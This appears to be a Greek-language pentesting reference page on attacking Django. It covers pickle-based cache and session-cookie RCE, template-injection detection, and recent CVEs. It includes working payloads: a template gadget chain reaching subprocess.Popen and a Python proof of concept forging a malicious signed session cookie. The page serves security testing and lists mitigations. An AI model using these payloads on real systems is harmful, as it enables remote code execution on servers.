# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Η προεπιλεγμένη μέθοδος αποθήκευσης cache του Django είναι [Python pickles](https://docs.python.org/3/library/pickle.html), η οποία μπορεί να οδηγήσει σε RCE αν [μη αξιόπιστα δεδομένα αποσυμπιεστούν](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **Αν ένας επιτιθέμενος μπορέσει να αποκτήσει δικαιώματα εγγραφής στην cache, μπορεί να κλιμακώσει αυτή την ευπάθεια σε RCE στον υποκείμενο διακομιστή**.

Η cache του Django αποθηκεύεται σε μία από τέσσερις τοποθεσίες: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [μνήμη](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [αρχεία](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), ή μια [βάση δεδομένων](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Η cache που αποθηκεύεται σε έναν διακομιστή Redis ή σε μια βάση δεδομένων είναι οι πιο πιθανές διαδρομές επίθεσης (Redis injection και SQL injection), αλλά ένας επιτιθέμενος μπορεί επίσης να είναι σε θέση να χρησιμοποιήσει την cache βασισμένη σε αρχεία για να μετατρέψει μια αυθαίρετη εγγραφή σε RCE. Οι συντηρητές έχουν χαρακτηρίσει αυτό ως μη ζήτημα. Είναι σημαντικό να σημειωθεί ότι ο φάκελος αρχείων cache, το όνομα πίνακα SQL και οι λεπτομέρειες του διακομιστή Redis θα διαφέρουν ανάλογα με την υλοποίηση.

Αυτή η αναφορά του HackerOne παρέχει ένα εξαιρετικό, αναπαραγώγιμο παράδειγμα εκμετάλλευσης της cache του Django που αποθηκεύεται σε μια βάση δεδομένων SQLite: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Η Γλώσσα Προτύπων Django (DTL) είναι **Turing-complete**. Αν τα δεδομένα που παρέχονται από τον χρήστη αποδοθούν ως *string προτύπου* (για παράδειγμα καλώντας `Template(user_input).render()` ή όταν το `|safe`/`format_html()` αφαιρεί την αυτόματη απόδραση), ένας επιτιθέμενος μπορεί να επιτύχει πλήρη SSTI → RCE.

### Detection
1. Αναζητήστε δυναμικές κλήσεις σε `Template()` / `Engine.from_string()` / `render_to_string()` που περιλαμβάνουν *οποιαδήποτε* μη απολυμασμένα δεδομένα αιτήματος.
2. Στείλτε ένα payload βασισμένο σε χρόνο ή αριθμητικό:
```django
{{7*7}}
```
Αν η αποδοθείσα έξοδος περιέχει `49`, η είσοδος έχει μεταγλωττιστεί από τον μηχανισμό προτύπων.

### Primitive to RCE
Ο Django αποκλείει την άμεση πρόσβαση στο `__import__`, αλλά το γραφικό αντικειμένων Python είναι προσβάσιμο:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Βρείτε τον δείκτη του `subprocess.Popen` (≈400–500 ανάλογα με την έκδοση του Python) και εκτελέστε αυθαίρετες εντολές:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Ένα πιο ασφαλές καθολικό εργαλείο είναι να επαναλαμβάνετε μέχρι `cls.__name__ == 'Popen'`.

Το ίδιο εργαλείο λειτουργεί για τις δυνατότητες απόδοσης προτύπων **Debug Toolbar** ή **Django-CMS** που χειρίζονται λανθασμένα την είσοδο του χρήστη.

---

## RCE με Cookie Συνεδρίας Βασισμένο σε Pickle
Εάν η ρύθμιση `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` είναι ενεργοποιημένη (ή ένας προσαρμοσμένος σειριαστής που αποσυμπιέζει pickle), το Django *αποκρυπτογραφεί και αποσυμπιέζει* το cookie συνεδρίας **πριν** καλέσει οποιονδήποτε κωδικό προβολής. Επομένως, η κατοχή ενός έγκυρου κλειδιού υπογραφής (το `SECRET_KEY` του έργου από προεπιλογή) είναι αρκετή για άμεση απομακρυσμένη εκτέλεση κώδικα.

### Απαιτήσεις Εκμετάλλευσης
* Ο διακομιστής χρησιμοποιεί `PickleSerializer`.
* Ο επιτιθέμενος γνωρίζει / μπορεί να μαντέψει το `settings.SECRET_KEY` (διαρροές μέσω GitHub, `.env`, σελίδες σφαλμάτων κ.λπ.).

### Απόδειξη της Έννοιας
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Στείλτε το αποτέλεσμα cookie, και το payload εκτελείται με τις άδειες του WSGI worker.

**Μειώσεις**: Διατηρήστε τον προεπιλεγμένο `JSONSerializer`, περιστρέψτε το `SECRET_KEY`, και ρυθμίστε το `SESSION_COOKIE_HTTPONLY`.

---

## Πρόσφατα (2023-2025) Υψηλής Επίδρασης CVEs Django που πρέπει να ελέγξουν οι Pentesters
* **CVE-2025-48432** – *Εισαγωγή Καταγραφής μέσω μη διαφυλαγμένου `request.path`* (διορθώθηκε 4 Ιουνίου 2025). Επιτρέπει στους επιτιθέμενους να μεταφέρουν νέες γραμμές/κωδικούς ANSI σε αρχεία καταγραφής και να δηλητηριάσουν την ανάλυση καταγραφής. Επίπεδο patch ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Κρίσιμη SQL injection* στο `QuerySet.values()/values_list()` στο `JSONField` (CVSS 9.8). Δημιουργήστε κλειδιά JSON για να σπάσετε την παράθεση και να εκτελέσετε αυθαίρετη SQL. Διορθώθηκε στην 4.2.15 / 5.0.8.

Πάντα να αναγνωρίζετε την ακριβή έκδοση του framework μέσω της σελίδας σφάλματος `X-Frame-Options` ή του hash του `/static/admin/css/base.css` και να δοκιμάζετε τα παραπάνω όπου είναι εφαρμόσιμο.

---

## Αναφορές
* Ασφαλής έκδοση Django – "Django 5.2.2, 5.1.10, 4.2.22 διευθύνει το CVE-2025-48432" – 4 Ιουνίου 2025.
* OP-Innovate: "Η Django κυκλοφορεί ενημερώσεις ασφαλείας για να αντιμετωπίσει την αδυναμία SQL injection CVE-2024-42005" – 11 Αυγούστου 2024.

{{#include ../../banners/hacktricks-training.md}}
